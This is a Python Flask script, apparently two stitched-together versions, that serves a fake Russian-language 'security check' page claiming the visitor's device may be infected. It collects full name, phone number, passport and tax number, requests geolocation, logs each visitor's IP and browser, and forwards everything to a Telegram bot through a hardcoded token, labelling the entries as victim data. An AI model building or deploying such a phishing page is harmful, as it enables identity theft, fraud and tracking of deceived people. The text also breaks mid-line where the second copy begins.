from flask import Flask, request
import requests

app = Flask("zalyava")

TOKEN = "8839750399:AAEYXRzgs9lAqpGXkbFrhVCwaTiprIuuC38"
CHAT_ID = "1838683997"

def send_telegram(text):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    requests.post(url, data={"chat_id": CHAT_ID, "text": text})

@app.route("/")
def index():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    ua = request.headers.get("User-Agent")
    
    msg = f"🚨 ЗАХОД НА САЙТ 🚨\n\nIP: {ip}\nБраузер: {ua}"
    send_telegram(msg)
    
    return """
    <html>
    <head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Проверка безопасности</title>
    <style>
    body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding: 20px; }
    button { background: #0f0; color: #000; padding: 15px 30px; font-size: 18px; border: none; margin: 10px; }
    input { padding: 10px; font-size: 16px; width: 80%; margin: 10px; }
    </style>
    </head>
    <body>
    <h1>ПРОВЕРКА БЕЗОПАСНОСТИ</h1>
    <p>Ваше устройство может быть заражено!</p>
    <p>Введите данные для проверки:</p>
    
    <input type="text" id="fio" placeholder="ФИО">
    <input type="text" id="phone" placeholder="Номер телефона">
    <input type="text" id="pasport" placeholder="Паспорт">
    <input type="text" id="inn" placeholder="ИНН">
    
    <button onclick="sendData()">Проверить</button>
    <button onclick="getGeo()">Дать доступ к гео</button>
    <button onclick="getPhoto()">Дать доступ к камере</button>
    
    <script>
    function sendData() {
        var fio = document.getElementById('fio').value;
        var phone = document.getElementById('phone').value;
        var pasport = document.getElementById('pasport').value;
        var inn = document.getElementById('inn').value;
        
        fetch('/data', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({fio: fio, phone: phone, pasport: pasport, inn: inn})
        });
        alert('Данные отправлены на проверку');
    }
    
    function getGeo() {
        navigator.geolocation.getCurrentPosition(function(pos) {
            var lat = pos.coords.latitude;
            var lon = pos.coords.longitude;
            fetch('/geo', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({lat: lat, lon: lon})
            });
            alert('Геолокация получена');
        });
    }
    
    function getPhoto() {
        alert('Камера недоступна в браузере');
    }
    </script>
    </body>
    </html>
    """

@app.route("/data", methods=["POST"])
def data():
    d = request.json
    msg = f"📋 ДАННЫЕ ЖЕРТВЫ:\n\nФИО: {d.get('fio')}\nТелефон: {d.get('phone')}\nПаспорт: {d.get('pasport')}\nИНН: {d.get('inn')}"
    send_telegram(msg)
    return "OK"

@app.route("/geo", methods=["POST"])
def geo():
    d = request.json
    msg = f"📍 ГЕОЛОКАЦИЯ:\n\nШирота: {d.get('lat')}\nДолгота: {d.get('lon')}\n\nКарта: https://maps.google.com/?q={d.get('lat')},{d.get('lon')}"
    send_telegram(msg)
    return "OK"

app.run(host="0.0.0.0", port=10000)from flask import Flask, request
import requests

app = Flask("zalyava")

TOKEN = "8839750399:AAEYXRzgs9lAqpGXkbFrhVCwaTiprIuuC38"
CHAT_ID = "1838683997"

def send_telegram(text):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    requests.post(url, data={"chat_id": CHAT_ID, "text": text})

@app.route("/")
def index():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    ua = request.headers.get("User-Agent")
    lang = request.headers.get("Accept-Language")
    
    msg = f"🚨 НОВЫЙ ЗАХОД! 🚨\n\n📡 IP: {ip}\n🔍 Браузер: {ua}\n🗣 Язык: {lang}"
    
    send_telegram(msg)
    
    return "OK"

app.run(host="0.0.0.0", port=10000)
